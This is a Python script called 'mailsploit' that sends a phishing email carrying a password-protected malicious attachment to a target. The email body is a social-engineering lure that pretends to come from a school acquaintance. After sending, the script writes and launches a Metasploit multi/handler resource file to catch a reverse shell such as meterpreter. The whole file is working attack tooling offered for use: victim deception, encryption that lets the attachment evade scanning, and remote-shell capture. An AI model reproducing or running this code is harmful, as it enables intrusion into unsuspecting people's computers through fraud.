#############################################################
#
# Title: mailsploit
# Author: Th3J0k3r
#
# Purpose: to be able to send a malicious payload via email
# to gain access to somones machine.
#
############################################################
import socket
import smtplib
import ConfigParser
import mimetypes
import email
import email.mime.application
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import encoders
from email.utils import COMMASPACE,formatdate
import time
import os
from lazyme.string import color_print


def banner ():

	color_print(
"""


'||\   /||`              '||`    .|'''|          '||`               ||   
 ||\\.//||           ''   ||     ||               ||          ''    ||   
 ||     ||   '''|.   ||   ||     `|'''|, '||''|,  ||  .|''|,  ||  ''||'' 
 ||     ||  .|''||   ||   ||      .   ||  ||  ||  ||  ||  ||  ||    ||   
.||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
                                          ||                             
                                         .||                             
                                                                                                                       
""", color='red')


def exploit ():

	# Setup the config file
	global name
	global email
	global password
	global target
	global subject
	global filename
	global payload
	global payload_new
	global payload_pass
	global payload_owner
	global debuglevel

	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')
	name = configParser.get('Config', 'name')
	email = configParser.get('Config', 'email')
	password = configParser.get('Config', 'password')
	target = configParser.get('Config', 'target')
	subject = configParser.get('Config', 'subject')
	filename = configParser.get('Config', 'filename')
	payload = configParser.get('Config', 'payload')
	payload_new = configParser.get('Config', 'payload_new')
	payload_pass = configParser.get('Config', 'payload_pass')
	payload_owner = configParser.get('Config', 'payload_owner')
	debuglevel = configParser.get('Config', 'debuglevel')
	# Validate the input.
	if email == 'None' or password == 'None' or target == 'None':
		color_print('[!] Please setup your config file.', color='red')	
		return

	# get the smtp server via user input.
	color_print("[ Press enter twice to send via gmail ]", color='blue')
	server = raw_input('What is the smtp server you want to connect to ex(smtp.gmail.com): ')
	if server == '':
		server = 'smtp.gmail.com'
	try:
	
		port   = int(raw_input('What is the port number: '))
	except ValueError:
		port = 25

	color_print(server, color='yellow')
	color_print(str(port), color='yellow')
		
	# attempt to connect to the stmp server.
	try:
		# Connected to server.
		color_print("\n[+] Connecting to smtp server..", color='blue')

		global s
		s = smtplib.SMTP()
		s.connect(host=server, port=port)
		s.ehlo()
		s.starttls()
		s.ehlo()
		color_print("[+] Connected.", color='green')

	except socket.gaierror:
		# Failed to connect!!.
		color_print("\n[!] Could not connect to the server.", color='red')
		return

	try:
		# login and send the payload.
		s.debuglevel = debuglevel
		s.login(email, password)
		color_print("\n Logged in.", color='green')
		sendpayload(s)
	except smtplib.SMTPAuthenticationError:
		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'")
		return



def sendpayload (server):

	msg = MIMEMultipart('alternative')	
	msg['From'] = email
	msg['To'] = target
	msg['Date'] = formatdate(localtime = True)
	msg['Subject'] = subject

	text = """
<html>
<title>
Very funny
</title>
<p>
Hi """ + name + """,
<br></br>
I think I know you from school, This is so funny check this out, you will laugh so hard. 
Sorry the code is """ + payload_pass + """
</p>
</html>
"""
	html = MIMEText(text, 'html')
	msg.attach(html)
	
	# Encrypt the payload
	color_print("[*] Encrypting payload", color='yellow')
	os.system("pdftk " + payload + " output " + payload_new + " owner_pw " + payload_owner + " user_pw "  + payload_pass) 

	# Attach the file.
	fileMsg = MIMEBase('application','octet-stream')
 	fileMsg.set_payload(file(payload_new).read())
	encoders.encode_base64(fileMsg)
 	fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
  	msg.attach(fileMsg)

	# Send the payload
	color_print("[*] Sending malicious payload..", color='yellow')
	s.sendmail(email, target, msg.as_string())
	color_print("[*] Sent.", color='green')
	s.quit()
	color_print("\n[*] Payload sent", color='green')

	# Do you want to listen for any connections.
	listen = raw_input('Do you want to start up a listener: [Y/N]')
	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
		color_print("[+] Starting a listener", color='blue')
		listenForConnections()
	else:
		color_print("Thanks, Happy hacking", color='blue')
		return	
			
			
def listenForConnections ():
	lhost = raw_input('What is your LHOST (local ip address): ')
	lport = raw_input('What is your LPORT (port): ')
	payload = raw_input('What is your payload: (ex windows/meterpreter/reverse_tcp): ')

	if os.path.isfile('resource.rc'):
		os.system('rm resource.rc')
	os.system('touch resource.rc')
	os.system('echo use exploit/multi/handler >> resource.rc')
	os.system('echo set PAYLOAD ' + payload + ' >> resource.rc')
	os.system('echo set LHOST ' + lhost + ' >> resource.rc') 
	os.system('echo set LPORT ' + lport + ' >> resource.rc')
	os.system('echo set ExitOnSession false >> resource.rc')
	os.system('echo exploit -j -z >> resource.rc')
	os.system('cat resource.rc')
	os.system('msfconsole -r resource.rc')
	

#### Call the methods ####
banner()
exploit()		

